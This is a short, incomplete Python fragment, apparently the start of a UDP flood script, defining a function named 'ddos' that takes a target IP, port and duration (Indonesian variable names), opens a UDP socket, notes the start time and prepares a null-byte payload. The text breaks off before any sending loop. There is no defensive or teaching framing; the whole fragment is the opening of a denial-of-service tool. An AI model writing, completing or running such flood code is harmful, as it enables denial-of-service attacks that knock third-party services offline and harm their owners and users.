def ddos(ip, port, durasi):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    waktu_mulai = time.time()
    payload = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    
